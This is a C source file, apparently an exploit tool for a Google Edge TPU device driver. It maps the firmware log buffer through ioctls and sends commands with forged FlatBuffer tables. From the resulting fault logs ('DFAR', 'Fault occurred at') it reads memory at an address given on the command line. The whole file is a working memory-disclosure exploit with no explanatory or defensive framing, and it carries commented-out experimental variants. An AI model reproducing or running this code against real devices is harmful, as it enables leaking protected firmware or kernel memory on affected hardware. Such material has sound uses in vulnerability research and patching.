#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h> 
#include "edgetpu.h"
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/dma-heap.h>
#include <stdint.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <time.h>

uint32_t prev_r3_from_subs_int(uint32_t r5, uint32_t r3_after) {
    return (uint32_t)((uint32_t)r5 - (uint32_t)r3_after);
}
static void hexdump_16(const void *buf, size_t len, size_t base_off)
{
    const unsigned char *p = (const unsigned char *)buf;

    for (size_t i = 0; i < len; i += 16) {
        size_t n = (len - i < 16) ? (len - i) : 16;

        // offset
        printf("%08zx  ", base_off + i);

        // hex bytes
        for (size_t j = 0; j < 16; j++) {
            if (j < n) printf("%02x ", p[i + j]);
            else       printf("   ");
            if (j == 7) printf(" "); // extra space in middle
        }

        // ascii
        printf(" |");
        for (size_t j = 0; j < n; j++) {
            unsigned char c = p[i + j];
            putchar(isprint(c) ? c : '.');
        }
        for (size_t j = n; j < 16; j++) putchar(' ');
        printf("|\n");
    }
}
int map_allocator_buf(void){
    int heap_fd = -1;
    int dmabuf_fd = -1;
    heap_fd = open("/dev/dma_heap/system", O_RDONLY);
      if (heap_fd < 0) {
          perror("open /dev/dma_heap/system");
          printf("[!] DMA-HEAP not available on this system\n");
          return -1;
      }

      printf("[+] Opened DMA-HEAP: /dev/dma_heap/system\n");

      // 2. Allocate a DMA-BUF.
      struct dma_heap_allocation_data alloc_data = {
          .len = 0x5000,                  // Allocate 40KB.
          .fd = 0,                        // Output parameter.
          .fd_flags = O_RDWR | O_CLOEXEC, // Read/write and close-on-exec.
          .heap_flags = 0,                // Heap-specific flags, normally zero.
      };

      printf("[*] Allocating %llu bytes...\n", alloc_data.len);

      if (ioctl(heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc_data) < 0) {
          perror("DMA_HEAP_IOCTL_ALLOC");
          close(heap_fd);
          return -1;
      }

      dmabuf_fd = alloc_data.fd;
      printf("[+] DMA-BUF allocated! fd=%d\n", dmabuf_fd);
      return dmabuf_fd;
}
uint32_t dumpMem_automatic(int32_t pass_dump_addr)
{
    int fd = -1;
    int fd_out = -1;
    int ret = 1;  /* Default to failure. */
    void *buf = NULL;
    // Allocator memory.
    void *allocator_buf = NULL;
   
    fd = open("/dev/edgetpu-soc", O_RDWR);
    if (fd < 0) {
        perror("open /dev/edgetpu-soc");
        return 1;
    }
    //print fd
    printf("fd: %d\n", fd);
    
    void *log_buffer = mmap(NULL, 0x0004000, PROT_READ|PROT_WRITE,
        MAP_SHARED, fd, 0x1b00000);
    if (log_buffer == MAP_FAILED) {
        perror("mmap");
        return -1;
    }
        printf("log_buffer: %p\n", log_buffer);
        //print log buffer
        printf("log buffer: %s\n", (char *)log_buffer);
        //print log buffer length
        printf("log buffer length: %d\n", strlen((char *)log_buffer));
        //print log buffer hex
        printf("log buffer hex: ");
    
        
        //0x00 
        //*(uint32_t *)(log_buffer + 0x00) = 0xffffffff;
        //*(uint32_t *)(log_buffer + 0x40) = 0xffffffff;
    
        //*(uint32_t *)(log_buffer + 0x00) = 0x3000;
        //*(uint32_t *)(log_buffer + 0x40) =0x1200;
    
        *(uint32_t *)(log_buffer + 0x00) = 0x00000000;
        *(uint32_t *)(log_buffer + 0x04) = 0x00010000;
    
        *(uint32_t *)(log_buffer + 0x40) = 0x00000000;
    /*
    // Print the log buffer at page offset 0x1B00000.
 void *log_buffer = mmap(NULL, 0x01000000, PROT_READ|PROT_WRITE,
    MAP_SHARED, fd, 0x1b00000);
if (log_buffer == MAP_FAILED) {
    perror("mmap");
    return 1;
}
    printf("log_buffer: %p\n", log_buffer);
    //print log buffer
    printf("log buffer: %s\n", (char *)log_buffer);
    //print log buffer length
    printf("log buffer length: %d\n", strlen((char *)log_buffer));
    //print log buffer hex
    printf("log buffer hex: ");
    
    //0x00 
    //*(uint32_t *)(log_buffer + 0x00) = 0xffffffff;
    //*(uint32_t *)(log_buffer + 0x40) = 0xffffffff;

    //*(uint32_t *)(log_buffer + 0x00) = 0x3000;
    //*(uint32_t *)(log_buffer + 0x40) =0x1200;

    *(uint32_t *)(log_buffer + 0x00) = 0x002e0000;
    *(uint32_t *)(log_buffer + 0x04) = 0x80000000;

    *(uint32_t *)(log_buffer + 0x40) = 0x002e0000;


    
   
    // Print a hexdump-style view, 16 bytes per line, with bytes on the left and characters on the right.
    printf("log buffer hexdump (0x4000 bytes):\n");
    //hexdump_16(log_buffer, 0x01000000, 0);
    printf("\n");
    */


    /*
    //mmap(0, (unsigned int)len, 3, 0x2001, v6, offset);
    void *mmap_buf = mmap(NULL, 0x1000, 3,0x2001, fd, 0);
    if (mmap_buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    printf("mmap_buf: %p\n", mmap_buf);
    //print something in mmap_buf
    printf("something in mmap_buf: %s\n", (char *)mmap_buf);
    */
    //alloc 128 bytes of memory
    const size_t page_size = 0x4000;
    allocator_buf = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (allocator_buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(allocator_buf, 0, page_size);
    buf = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (buf == MAP_FAILED) {
 perror("mmap");
 return 1;
}
//fill buf with 0x12345678
memset(buf, 0, page_size);
uint8_t *buf8 = (uint8_t *)buf;

// 1) root table offset = 0x20
*(uint32_t *)(buf8 + 0) = 0x20;   // Key dump location 1 for unk_index.
// 2) table[0] = -0x10. The vtable is at table+0x10, i.e., 0x20+0x10 = 0x30.
*(int32_t *)(buf8 + 0x20) = -0x10;  // 0xFFFFFFF0
//*(int32_t *)(buf8 + 0x20) = 0xffffffff;
// 3) vtable at buf+0x30
uint16_t *vt = (uint16_t *)(buf8 + 0x30);
vt[0] = 0x000A;   // vtable_len > 8; uVar1 must be at least 9.
vt[1] = 0x0010;   // object_size; any value >= 0xC is sufficient.
vt[2] = 0x0000;   // field0 offset (unused)
vt[3] = 0x0004;   // field1: type-field offset = 4; key dump location 2 for cmdtype.
//cmdType = (uint)*(ushort *)((int)flatbuffer + iVar3 + unk_index + 8);
vt[4] = 0x0008;   // field2: payload-field offset = 8.

// 4) type field = 0x05; key dump location 3.
buf8[0x20 + 4] = 0x05;

// Compute the payload offset for the target dump address.

int32_t dump_addr=pass_dump_addr;
int32_t fill_content=dump_addr-0x28+0x4000;
// 5) Payload offset word: make payload_ptr = buf+0x60.
*(int32_t *)(buf8 + 0x20 + 8) = fill_content;  // 0x60 - (0x20+8) = 0x38, the 4 bytes we control.
//              cmdType = (int)flatbuffer +*(int *)((int)flatbuffer + cmdType + unk_index) + cmdType + unk_index
// *(int *)((int)flatbuffer + cmdType + unk_index) = 0x38
// 6) Optional: place data at buf+0x60 so the handler has readable content.
/*
uint8_t *payload = buf8 + 0x20202020;

// table[0] = -0x10; the vtable is at payload+0x10.
*(int32_t *)(payload + 0x00) = -0x70; //-0x70

// vtable at payload+0x10
uint16_t *vt_payload = (uint16_t *)(payload + 0x70);
vt_payload[0] = 0x0008;  // vtable_len > 4
vt_payload[1] = 0x000C;  // object_size >= 0xC
vt_payload[2] = 0x0074;  // Third-field offset = 4.
// Field: write ofs = 4 at payload+74.
*(uint32_t *)(payload + 0x74) = 0x74;

// Field: write a nonzero value at payload+8.
*(uint32_t *)(payload + 0x74+0x74) = 0x4;
//memset(payload + 12, 0x10, 0x4);
memset(payload + 0x74+0x74+0x4, 0x20, 0x4);
memset(payload + 0x74+0x74+0x4+0x8, 0x20, 0x4);
//uint64_t *allocateAddr = (uint64_t *)(payload + 0x74+0x74+0x4);
*/

 
    //print buf
    printf("buf: %p\n", buf);
    printf("buf: %p (aligned %s)\n",
           buf, (((uintptr_t)buf & (page_size - 1)) == 0) ? "YES" : "NO");
    //create group
    struct edgetpu_mailbox_attr create_group_ioctl = {
        .cmd_queue_size = 1,
        .resp_queue_size = 1,
        .sizeof_cmd = 128,
        .sizeof_resp = 128,
        //.priority = 1,
        //.partition_type = 1,
    };
    ret = ioctl(fd, EDGETPU_CREATE_GROUP, &create_group_ioctl);
    if (ret < 0) {
        perror("ioctl EDGETPU_CREATE_GROUP");
        return 1;
    }
    printf("ioctl EDGETPU_CREATE_GROUP ret: %d\n", ret);

    //edgetpu_ioctl_finalize_group
    ret = ioctl(fd, EDGETPU_FINALIZE_GROUP);
    if (ret < 0) {
        perror("ioctl EDGETPU_FINALIZE_GROUP");
        return 1;   
    }
    printf("ioctl EDGETPU_FINALIZE_GROUP ret: %d\n", ret);
    struct edgetpu_map_ioctl map_ioctl = {
        .host_address = (uint64_t)buf,
        .size = page_size,    
        .device_address = 0x0,
        .flags = 0x0,
        .die_index = 0
    };
    ret = ioctl(fd, EDGETPU_MAP_BUFFER, &map_ioctl);
    if (ret < 0) {
        perror("ioctl EDGETPU_MAP_BUFFER");
        return 1;
    }
    printf("device_address: %lx\n", map_ioctl.device_address);
    printf("ioctl EDGETPU_MAP_BUFFER ret: %d\n", ret);
    //edgetpu_ioctl_acquire_wakelock
    ret = ioctl(fd, EDGETPU_ACQUIRE_WAKE_LOCK);
    if (ret < 0) {
        perror("ioctl EDGETPU_ACQUIRE_WAKE_LOCK");
        return 1;
    }
    printf("ioctl EDGETPU_ACQUIRE_WAKELOCK ret: %d\n", ret);
    //edgetpu_ioctl_vii_command
    /*
      seq          = 12
  code         = 0
  priority     = 11
  dma.address  = 0xffeff000
  dma.size     = 128
  dma.flags    = 0x0
  client_id    = 0
  qos_class    = 2
  cluster_ids  = 0x1
  atomic       = 0
  in_fence_array  = 0x0  count = 0
  out_fence_array = 0x0  count = 0
  in_fences  = []
  out_fences = []
    */
    struct edgetpu_vii_command_ioctl vii_command_ioctl = {
        .in_fence_array = 0,
        .in_fence_count = 0,
        .out_fence_array = 0,
        .out_fence_count = 0,
        .command = {
            .seq = 12,
            .code = 0,
            .priority = 11,
            .dma_descriptor = {
                .address = map_ioctl.device_address,
                .size = page_size,
                .flags = 0x0,
            },
            .client_id = 0,
            .qos_class = 2,
            .cluster_ids_bitset = 0x1,
        },
    };
    ret = ioctl(fd, EDGETPU_VII_COMMAND, &vii_command_ioctl);
    if (ret < 0) {
        perror("ioctl EDGETPU_VII_COMMAND");
        return 1;
    }
    printf("ioctl EDGETPU_VII_COMMAND ret: %d\n", ret);



   
    
// Second invocation.
//------------------------------------------------------------
const size_t page_size_second = 0x4000;
    void *buf_second = mmap(NULL, page_size_second, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf_second == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(buf_second, 0, page_size_second);
    uint8_t *buf8_second = (uint8_t *)buf_second;
    buf8_second[0] = 0x20; //unk_index
    buf8_second[1] = 0x00;
    buf8_second[2] = 0x00;
    buf8_second[3] = 0x00;

    *(int32_t *)(buf8_second + 0x20) = -0x10;  // 0xFFFFFFF0

    uint16_t *vt_second = (uint16_t *)(buf8_second + 0x30);
vt_second[0] = 0x000B;   // vtable_len > 8; uVar1 must be at least 9.
vt_second[1] = 0x0014;   // object_size; any value >= 0xC is sufficient.
vt_second[2] = 0x0000;   // field0 offset (unused)
vt_second[3] = 0x0004;   // field1: type-field offset = 4, cmdtype.
//cmdType = (uint)*(ushort *)((int)flatbuffer + iVar3 + unk_index + 8);
vt_second[4] = 0x0008;   // field2: payload-field offset = 8.


// 4) type field = 0x05.
buf8_second[0x20 + 4] = 0x06;
//
// 5) Payload offset word: make payload_ptr = buf+0x60.
*(int32_t *)(buf8_second + 0x20 + 8) = 0x38;  // 0x60 - (0x20+8) = 0x38
//              cmdType = (int)flatbuffer +*(int *)((int)flatbuffer + cmdType + unk_index) + cmdType + unk_index
// *(int *)((int)flatbuffer + cmdType + unk_index) = 0x38
// 6) Optional: place data at buf+0x60 so the handler has readable content.
uint8_t *payload_second = buf8_second + 0x60;

// 1) Set table[0] referenced by payload_second to 0x10.
//    Then v4 = (uint16_t *)(payload - *payload) = payload_second - 0x10.
*(int32_t *)(payload_second + 0x00) = 0x10;

// 2) Forge a FlatBuffer vtable at payload_second - 0x10.
uint16_t *vtable = (uint16_t *)(payload_second - 0x10);

// v5 = *v4 = vtable[0]; it must be > 4, so 0x0008 is sufficient.
vtable[0] = 0x000A;      // v5 = 8

// vtable[1] = object size under FlatBuffer semantics.
// Any value >= 0x54 is sufficient; 0x0060 leaves some slack.
vtable[1] = 0x0060;

// v4[2] = v7 = field offset from payload; it should point to the target 0x50.
vtable[2] = 0x0050;      // v7 = 0x50 -> payload+0x50

vtable[3] = 0x0004;
vtable[4] = 0x0080;

// 3) Fill the two u32 argument slots at payload+0x50.
*(uint64_t *)(payload_second + 0x50) = 0x20202020;  // Third argument.
*(uint64_t *)(payload_second + 0x58) = 0x1000;  // Fourth argument.
// Keep 0x80/0x84 unchanged if later logic still uses them.
*(uint32_t *)(payload_second + 0x80) = 0x21ffffff; // Key dump location.

//registr info
*(uint32_t *)(payload_second+0x80+0x20) = 0x50; //length
*(uint32_t *)(payload_second+0x80+0x20+4) = 0x22ffffff;


// vtable at payload+0x10





// table[0] = -0x10; the vtable is at payload+0x10.
//*(int32_t *)(payload_second + 0x00) = -0x70;


// vtable at payload+0x10
//uint16_t *vt_payload_second = (uint16_t *)(payload_second + 0x70);

//vt_payload_second[0] = 0x0000;  // vtable_len > 4
//vt_payload_second[1] = 0x000C;  // object_size >= 0xC
//vt_payload_second[2] = 0x0074;  // Third-field offset = 4.
// Field: write ofs = 4 at payload+74.
//*(uint32_t *)(payload_second + 0x74) = 0xffffffff;

// Field: write a nonzero value at payload+8.
//*(uint32_t *)(payload_second + 0x74+0x74) = 0x4;
//memset(payload + 12, 0x10, 0x4);
//memset(payload_second + 0x74+0x74+0x4, 0x20, 0x4);
//memset(payload_second + 0x74+0x74+0x4+0x8, 0x20, 0x4);

struct edgetpu_map_ioctl map_ioctl_second = {
    .host_address = (uint64_t)buf_second,
    .size = page_size_second,    
    .device_address = 0x0,
    .flags = 0x0,
    .die_index = 0
};
ret = ioctl(fd, EDGETPU_MAP_BUFFER, &map_ioctl_second);
if (ret < 0) {
    perror("ioctl EDGETPU_MAP_BUFFER second");
    return 1;
}
printf("device_address: %lx\n", map_ioctl_second.device_address);



printf("ioctl EDGETPU_MAP_BUFFER second ret: %d\n", ret);
    struct edgetpu_vii_command_ioctl vii_command_ioctl_second = {
        .in_fence_array = 0,
        .in_fence_count = 0,
        .out_fence_array = 0,
        .out_fence_count = 0,
        .command = {
            .seq = 13,
            .code = 0,
            .priority = 11,
            .dma_descriptor = {
                .address = map_ioctl_second.device_address,
                .size = page_size_second,
                .flags = 0x0,
            },
            .client_id = 2,
            .qos_class = 2,
            .cluster_ids_bitset = 0x1,
        },
    };


    ret = ioctl(fd, EDGETPU_VII_COMMAND, &vii_command_ioctl_second);
    if (ret < 0) {
        perror("ioctl second EDGETPU_VII_COMMAND");
        return 1;
    }
    printf("ioctl second EDGETPU_VII_COMMAND ret: %d\n", ret);
 
    //edgetpu_ioctl_vii_response
    struct edgetpu_vii_response_ioctl vii_response_ioctl = {
        .response = {
            .seq = 12,
            .code = 0,
            .client_id = 0,
            .cluster_index = 0,
            .retval = 0,
        },
    };
    ret = ioctl(fd, EDGETPU_VII_RESPONSE, &vii_response_ioctl);
    
    //based on code, print the response
    printf("response: %d\n", vii_response_ioctl.response.code);
    printf("response: %lx\n", vii_response_ioctl.response.retval);
    if (vii_response_ioctl.response.code == VII_RESPONSE_CODE_KERNEL_CMD_TIMEOUT) 
    {
        printf("response cmd timeout");
    }else if (vii_response_ioctl.response.code == VII_RESPONSE_CODE_KERNEL_ENQUEUE_FAILED) {
        printf("response enqueue failed");
    }else if (vii_response_ioctl.response.code == VII_RESPONSE_CODE_KERNEL_FENCE_ERROR) {
        printf("response fence error");
    }else if (vii_response_ioctl.response.code == VII_RESPONSE_CODE_KERNEL_FENCE_TIMEOUT) {
        printf("response fence timeout");
    }else if (vii_response_ioctl.response.code == VII_RESPONSE_CODE_KERNEL_CANCELED) {
        printf("response canceled");
    }
    printf("ioctl EDGETPU_VII_RESPONSE ret: %d\n", ret);
     // Print the log buffer at page offset 0x1B00000.
   
    // Print a hexdump-style view, 16 bytes per line, with bytes on the left and characters on the right.
    printf("log buffer hexdump (0x4000 bytes):\n");
    //hexdump_16(log_buffer, 0x0004000, 0);
    printf("\n");
    //free all mmap memory except log_buffer
    //search "Fault occurred at: " bytes array
    

    //search "DFAR: " bytes array
    uint8_t dfar_bytes[] = {0x44, 0x46, 0x41, 0x52, 0x3a, 0x20};
    char *dfar = memmem((char *)log_buffer, 0x0004000, dfar_bytes, sizeof(dfar_bytes));
    //print offset of dfar
    //printf("dfar offset: %ld\n", dfar - (char *)log_buffer);
    //printf("dfar: %p\n", dfar);
    if (dfar) {
        char* true_dfar=(char*)(dfar + 6); 
        //0d 0a is end of string
        char* error_address=(char*)malloc(20);
        if (error_address == NULL) {
            printf("malloc error\n");
            goto out;
        }
        memset(error_address, 0, 20);
        int i=0;
        while (true_dfar[i] != 0x0d && true_dfar[i+1]!= 0x0a) {
            //printf("true_dfar: %02x\n", true_dfar[i]);
            error_address[i] = true_dfar[i];
            i++;
        }
        //error_address is hex string, transform to int32_t
        uint32_t error_address_int = strtol(error_address, NULL, 16);    
        uint32_t prev_r3 = prev_r3_from_subs_int(pass_dump_addr, error_address_int);
        //printf("error_address: 0x%lx\n", error_address_int);
        //printf("prev_r3: 0x%lx\n", prev_r3);
        close(fd);
        
        uint8_t fault_occurred_at_bytes[] = {0x46, 0x61, 0x75, 0x6c, 0x74, 0x20, 0x6f, 0x63, 0x63, 0x75, 0x72, 0x72, 0x65, 0x64, 0x20, 0x61, 0x74, 0x3a, 0x20};
    char *fault_occurred_at = memmem((char *)log_buffer, 0x0004000, fault_occurred_at_bytes, sizeof(fault_occurred_at_bytes));
    if (fault_occurred_at) {
        //offset of fault_occurred_at comparing with log_buffer
        int offset_fault_occurred_at = fault_occurred_at - (char *)log_buffer;
        //printf("offset_fault_occurred_at: %d\n", offset_fault_occurred_at);
        char* fault_occurred_at_address=(char*)(fault_occurred_at + 19);
        //printf("fault_occurred_at_address: 0x%s\n", fault_occurred_at_address);
        //0d 0a is end of string change 
        char* fault_occurred_at_address_hex=(char*)malloc(20);
        if (fault_occurred_at_address_hex == NULL) {
            printf("malloc error\n");
            goto out;
        }
        memset(fault_occurred_at_address_hex, 0, 20);
        int yk=0;
        while (fault_occurred_at_address[yk] != 0x0d && fault_occurred_at_address[yk+1]!= 0x0a) {
            //printf("fault_occurred_at_address: %02x\n", fault_occurred_at_address[yk]);
            fault_occurred_at_address_hex[yk] = fault_occurred_at_address[yk];
            yk++;
        }
        //error_address is hex string, transform to int32_t
        uint32_t fault_occurred_at_address_int = strtol(fault_occurred_at_address_hex, NULL, 16);
        printf("fault_occurred_at_address_int: 0x%lx\n", fault_occurred_at_address_int);
        //compare with 0x1002B426 
        if (fault_occurred_at_address_int != 0x1002B426) {
            printf("fault_occurred_at_address_int is not equal to 0x1002B426\n");
            printf("prev_r3: 0x%lx\n", prev_r3);
            close(fd);
            return -1;
        }
    }else{
        printf("Fault occurred at not found\n");
        goto out;
    }
         
        return prev_r3;
    }else {
        printf("DFAR not found\n");
        close(fd);
        goto out;
    }

out:
if (log_buffer != MAP_FAILED) munmap(log_buffer, 0x0004000);
if (buf != MAP_FAILED) munmap(buf, page_size);
if (buf_second != MAP_FAILED) munmap(buf_second, page_size_second);
if (allocator_buf != MAP_FAILED) munmap(allocator_buf, page_size);
if (fd >= 0) close(fd);
return -1;
    
}



    
int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <dump_addr>\n", argv[0]);
        fprintf(stderr, "  e.g. %s 0x10000000\n", argv[0]);
        fprintf(stderr, "       %s 268435456\n", argv[0]);
        return 2;
    }

    errno = 0;
    char *end = NULL;
    uint32_t dump_addr = (uint32_t)strtoul(argv[1], &end, 0); // base=0 supports the 0x prefix.
    if (errno != 0 || end == argv[1] || *end != '\0') {
        fprintf(stderr, "Bad address: '%s'\n", argv[1]);
        return 2;
    }

    struct timespec ts_start, ts_end;
    clock_gettime(CLOCK_MONOTONIC, &ts_start);

    uint32_t val = dumpMem_automatic((int32_t)dump_addr);

    clock_gettime(CLOCK_MONOTONIC, &ts_end);
    double elapsed_s = (double)(ts_end.tv_sec  - ts_start.tv_sec)
                     + (double)(ts_end.tv_nsec - ts_start.tv_nsec) / 1e9;
    fprintf(stderr,
            "[TIME] dump 0x%08x elapsed %.6f s (%.3f ms) status=%s\n",
            (uint32_t)dump_addr,
            elapsed_s,
            elapsed_s * 1e3,
            ((int32_t)val == -1) ? "fail" : "ok");

    if ((int32_t)val == -1) {
        fprintf(stderr, "dumpMem_automatic failed\n");
        return 1;
    }

    printf("content: 0x%08lx at 0x%08lx\n", val, dump_addr);
    return 0;
}
